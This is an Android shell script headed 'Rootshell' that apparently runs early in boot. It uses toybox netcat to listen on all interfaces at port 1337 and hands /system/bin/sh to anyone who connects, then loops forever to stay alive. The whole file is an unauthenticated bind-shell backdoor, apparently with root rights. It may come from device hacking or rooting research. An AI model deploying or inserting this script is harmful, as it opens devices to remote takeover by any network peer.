#!/system/bin/sh
# Rootshell "pre data-fs"

toybox netcat -s 0.0.0.0 -p 1337 -L /system/bin/sh -l &

while [ 1 ]
do
	sleep 30
done
